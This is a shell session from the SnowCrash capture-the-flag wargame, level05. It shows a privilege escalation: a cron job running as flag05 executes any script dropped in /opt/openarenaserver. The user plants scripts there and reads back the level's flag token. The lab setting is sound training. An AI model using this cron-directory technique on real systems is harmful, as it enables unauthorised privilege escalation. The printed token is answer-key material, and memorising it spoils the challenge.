level05@SnowCrash:/opt/openarenaserver$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/opt/openarenaserver$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
level05@SnowCrash:/opt/openarenaserver$ echo "/usr/bin/whoami > /tmp/hacked" > hacked.sh
level05@SnowCrash:/opt/openarenaserver$ chmod +x hacked.sh
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/hacked
level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/flag05_result" > exploit.sh
level05@SnowCrash:/opt/openarenaserver$ chmod +x exploit.sh
level05@SnowCrash:/opt/openarenaserver$ sleep 120
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05_result
Check flag.Here is your token : viuaaale9huek52boumoomioc